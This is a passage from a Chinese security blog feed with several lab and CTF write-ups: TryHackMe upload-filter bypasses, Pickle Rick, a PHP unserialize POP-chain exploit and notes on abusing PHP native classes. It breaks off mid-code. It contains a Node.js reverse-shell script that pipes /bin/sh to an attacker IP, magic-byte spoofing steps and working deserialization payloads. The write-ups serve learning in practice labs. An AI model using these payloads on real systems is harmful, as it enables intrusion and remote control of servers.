是选择上传的文件</p><p>upload是进行上传</p><p>chosen 输出所选文件的名称</p><p>上传php5的后缀可以上传成功 然后利用dirsearch可以把文件存放的路径给爆破出来。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262022433.png" alt="image-20240326202219319"></p><p>Bypassing Server-Side Filtering: Magic Numbers</p><p>这个的话就是对文件头的一个检查 加一个GIF89a即可绕过。</p><p>挑战:</p><p>首先我们进去之后发现是一个nodejs的服务，这时候我们就不能用php了，可以去网上找一个反弹shell的脚本。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> net = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;net&quot;</span>),<br>    cp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>),<br>    sh = cp.<span class="hljs-title function_">spawn</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>, []);<br>    <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> net.<span class="hljs-title class_">Socket</span>();<br>    client.<span class="hljs-title function_">connect</span>(port, <span class="hljs-string">&quot;此处替换为攻击端IP&quot;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        client.<span class="hljs-title function_">pipe</span>(sh.<span class="hljs-property">stdin</span>);<br>        sh.<span class="hljs-property">stdout</span>.<span class="hljs-title function_">pipe</span>(client);<br>        sh.<span class="hljs-property">stderr</span>.<span class="hljs-title function_">pipe</span>(client);<br>    &#125;);<br>    <span class="hljs-keyword">return</span> <span class="hljs-regexp">/a/</span>;<br>&#125;)();<br></code></pre></td></tr></table></figure><p>通过扫描后台可以得到一些路径</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262105826.png" alt="image-20240326210524742"></p><p>通过查看网页源代码:</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262106029.png" alt="image-20240326210645953"></p><p>找到相关的信息。</p><p>然后可以看到它过滤的一些信息点。文件大小，文件名(只让上传jpg的文件)，以及文件头的信息。</p><p>所以我们首先先构造一下这个js的反弹shell的脚本，然后再进行修改。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span>.使用hexeditor xx.<span class="hljs-keyword">js </span>进行修改文件头 <br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262135288.png" alt="image-20240326213544023"></p><p>然后修改后缀，最后查看一下大小是否符合</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262138244.png" alt="image-20240326213846172"></p><p>然后上传上去，接下来就是找上传后的路径了。</p><p>因为我们上传的是jpg图片，然后我们可以找到jpg图片所存储的位置。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262143993.png" alt="image-20240326214355942"></p><p>在/content/目录下</p><p>可以利用ffuf进行暴力破解，然后就可以得到我们上传进去的文件名了</p><p>然后去访问等待反弹shell即可</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262204212.png" alt="image-20240326220433985"></p><p>记得上传文件时进行抓包，修改一下里面的值</p><p>把那个base64编码的替换成自己的js反弹shell经过base64编码后的值</p><p>要不然的话这个shell文件就不会触发</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262228588.png" alt="image-20240326222858465"></p><h3 id="Pickle-Rick"><a href="#Pickle-Rick" class="headerlink" title="Pickle Rick"></a>Pickle Rick</h3><p>首先扫描后台，发现login.php 还有robots.txt  查看网页源代码发现用户名，然后robots.txt里面的是登录密码。</p><p>登录进去之后可以执行系统命令，但是cat被过滤了，所以我们使用tac来查看Sup3rS3cretPickl3Ingred.txt的内容</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271044772.png" alt="image-20240327104354509"></p><p>然后查看后面的页面时，发现无权限访问，然后whoami看了一下，发现并不是root用户，猜测这里要进行提权。</p><p>第二部分:</p><p>试了一下sudo whoami 直接就是root用户了</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271102735.png" alt="image-20240327110239492"></p><p>我们在/home目录下找到了rick</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271109656.png" alt="image-20240327110910558"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271123121.png" alt="image-20240327112321022"></p><p>记得文件名加引号</p><p>第三部分:</p><p>在/root目录里面</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271138387.png" alt="image-20240327113843143"></p><p>最后利用sudo tac /root/3rd.txt 查看即可</p>]]></content>
    
    
    <categories>
      
      <category>tryhackme学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ez_unserialize</title>
    <link href="/2023/12/25/ezunserialize/"/>
    <url>/2023/12/25/ezunserialize/</url>
    
    <content type="html"><![CDATA[<h1 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h1><p>这道题是不难的 是我想复杂了</p><p>下面是源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Good</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$g1</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$gg2</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$ggg3</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;gg2 = <span class="hljs-variable">$ggg3</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/a-zA-Z0-9~-=!\^\+\(\)/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;gg2))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;gg2)<br>            &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;g1-&gt;g1=<span class="hljs-number">666</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;No&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Luck</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$l1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ll2</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$md5</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lll3</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;md5 = <span class="hljs-variable">$a</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$new</span> = <span class="hljs-variable language_">$this</span>-&gt;l1;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$new</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ll2-&gt;<span class="hljs-title function_ invoke__">ll2</span>(<span class="hljs-string">&#x27;b2&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;md5)) == <span class="hljs-number">666</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;lll3-&gt;lll3))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;There is noting&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">To</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$tt2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$this</span>-&gt;arg1)===<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$this</span>-&gt;arg1))<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t1;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;tt2-&gt;tt2)<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;what are you doing?&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">You</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$y1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;y1-&gt;y1);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;May be you can get what you want here&quot;</span>;<br>        <span class="hljs-title function_ invoke__">array_walk</span>(<span class="hljs-variable">$this</span>, function (<span class="hljs-variable">$one</span>, <span class="hljs-variable">$two</span>) &#123;<br>            <span class="hljs-variable">$three</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$two</span>(<span class="hljs-variable">$one</span>);<br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$three</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$tmp</span>)&#123;<br>                <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$tmp</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;D0g3&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;D0g3&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>利用点就是这个invoke魔术方法 利用原生类去查找和读取文件</p><p>pop链构造思想如下：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">invoke</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">toString</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">call</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">get</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">set</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">isset</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">unset</span>-&gt;</span>wakeup<br></code></pre></td></tr></table></figure><p>当时我是想错了 还有原生类的利用错了</p><p>这里有几个点 </p><p>1.双md5 这个地方用简单的脚本一下就行  可以得到数字 213</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt;= <span class="hljs-number">1000000000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$i</span>);<br>    <span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$c</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) === <span class="hljs-string">&#x27;666&#x27;</span>) &#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-variable">$i</span>;<br>        <span class="hljs-keyword">break</span>;  <span class="hljs-comment">// 如果找到匹配，退出循环</span><br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>2.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(urldecode(<span class="hljs-variable">$this</span>-&gt;arg1)</span></span>===<span class="hljs-built_in">base64_decode</span>(<span class="hljs-variable">$this</span>-&gt;arg1))<br></code></pre></td></tr></table></figure><p>这个地方用数组绕过</p><p>3.if(!preg_match(“/a-zA-Z0-9~-=!^+()/“,$this-&gt;gg2))   这个正则的话用$就可以绕过</p><p>下面是pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Good</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$g1</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$gg2</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$ggg3</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;gg2 = <span class="hljs-variable">$ggg3</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Luck</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$l1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ll2</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$md5</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lll3</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;md5 = <span class="hljs-variable">$a</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">To</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$tt2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg1</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">You</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$y1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;y1-&gt;y1);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$FilesystemIterator</span>=<span class="hljs-string">&#x27;/&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Good</span>(<span class="hljs-string">&#x27;$&#x27;</span>);<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Luck</span>(<span class="hljs-string">&#x27;213&#x27;</span>);<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">To</span>();<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">You</span>();<br><span class="hljs-variable">$e</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$b</span>-&gt;l1=<span class="hljs-variable">$e</span>;<br><span class="hljs-variable">$c</span>-&gt;arg1[]=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$c</span>-&gt;t1=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;ll2=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$c</span>-&gt;tt2=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$a</span>-&gt;g1=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$b</span>-&gt;lll3=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$d</span>-&gt;y1=<span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$d</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202312252325427.png" alt="image-20231225232519189"></p><p>然后就是利用SplFileObject去读取flag</p><p>这里就不做展示了</p>]]></content>
    
    
    <categories>
      
      <category>赛题复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>2023安洵杯复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php原生类反序列化</title>
    <link href="/2023/11/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    <url>/2023/11/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP原生类反序列化"><a href="#PHP原生类反序列化" class="headerlink" title="PHP原生类反序列化"></a>PHP原生类反序列化</h1><p>网上的一篇文章：</p><p><a href="https://www.anquanke.com/post/id/264823">https://www.anquanke.com/post/id/264823</a></p><p>根据上面那个来具体的学习一下</p><p>分类：</p><h2 id="1-读取目录-文件（内容）"><a href="#1-读取目录-文件（内容）" class="headerlink" title="1.读取目录/文件（内容）"></a>1.读取目录/文件（内容）</h2><p>读取文件目录/文件名字的有两个类</p><p>1.DirectoryIterator 2.FilesystemIterator</p><p>其中FilesystemIterator是一个子类</p><p>它两个下面都有_toString魔术方法  通过触发这个魔术方法，利用glob:///进行一个读取</p><p>下面看一下具体的例子，并看一下两者的区别</p><h3 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a><strong>DirectoryIterator</strong></h3><p>((PHP 5, PHP 7, PHP 8))</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$dir</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这个读取的是当前目录下的文件名字，并不会显示上一层的名字</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151629842.png" alt="image-20230624172914303"></p><h3 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a><strong>FilesystemIterator</strong></h3><p>((PHP 5 &gt;= 5.3.0, PHP 7, PHP 8))</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151629412.png" alt="image-20230624173320866"></p><p>这个会显示你上一级的名字</p><p>这两个类同样也有一句话形式payload：</p><p>DirectoryIterator:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;<br></code></pre></td></tr></table></figure><p>FilesystemIterator:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span 